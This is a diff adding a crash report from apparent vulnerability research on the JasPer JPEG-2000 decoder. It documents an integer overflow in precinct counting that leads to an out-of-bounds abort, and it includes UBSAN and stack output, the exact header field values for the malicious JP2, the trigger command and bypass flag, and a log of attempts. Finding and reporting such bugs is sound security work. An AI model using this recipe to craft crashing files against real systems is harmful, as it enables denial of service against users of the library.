@@ -1,0 +1,45 @@
+VERIFIED_CRASH
+
+=== Key Errors Triggered ===
+
+1. UBSAN signed integer overflow (core vulnerability):
+   jpc_dec.c:777:35: runtime error: signed integer overflow: 65537 * 65537 cannot be represented in type 'int'
+   Call stack:
+     #0 jpc_dec_tileinit  (jpc_dec.c:777)
+     #1 jpc_dec_process_sod
+     #2 jpc_decode
+     #3 jp2_decode
+     #4 jas_image_decode
+     #5 main
+
+2. Assertion failure (OOB access consequence):
+   imginfo: jpc_t2cod.c:305: jpc_pi_nextrpcl:
+   Assertion 'pi->prcno < pi->pirlvl->numprcs' failed.
+   → Process aborted (SIGABRT / core dump)
+
+=== Vulnerability Chain Confirmed ===
+
+- SIZ: Xsiz=Ysiz=XTsiz=YTsiz=65537 → single tile of 65537×65537 pixels
+- COD: numDecompLvls=0, RPCL progression, explicit precinct size 0x00
+  → prcwidthexpn=prcheightexpn=0 → 1×1 pixel precincts
+  → numhprcs=numvprcs=65537
+  → numprcs = 65537 * 65537 = 4295098369 → INT OVERFLOW → truncated to 131073
+- band->prcs allocated with 131073 entries (should be 65537*65537)
+- pirlvl->prclyrnos allocated with 131073 entries
+- pirlvl->numhprcs preserved as 65537 (true value)
+- RPCL iterator at y=1, x=65536: prcno = 1*65537 + 65536 = 131073 >= 131073 → CRASH
+
+=== PoC Files ===
+
+vuln_001_gen.py   - generates vuln_001.jp2
+vuln_001.jp2      - malicious 150167-byte JP2 file
+vuln_001_run.sh   - trigger: imginfo --max-samples 0 -f vuln_001.jp2
+vuln_001_result.txt - this output (UBSAN + abort)
+
+=== Notes ===
+
+- Requires: imginfo --max-samples 0 (bypasses 67M sample limit check)
+- Requires: ~34 GB RAM for tile component matrix (65537×65537 × 8 bytes)
+- Attempt 1 (no QCD): failed - jpc_dec_cp_isvalid returned 0 (QSET not set)
+- Attempt 2 (numDecompLvls=1, no QCD): failed - same reason
+- Attempt 3 (numDecompLvls=0 + QCD marker): VERIFIED CRASH
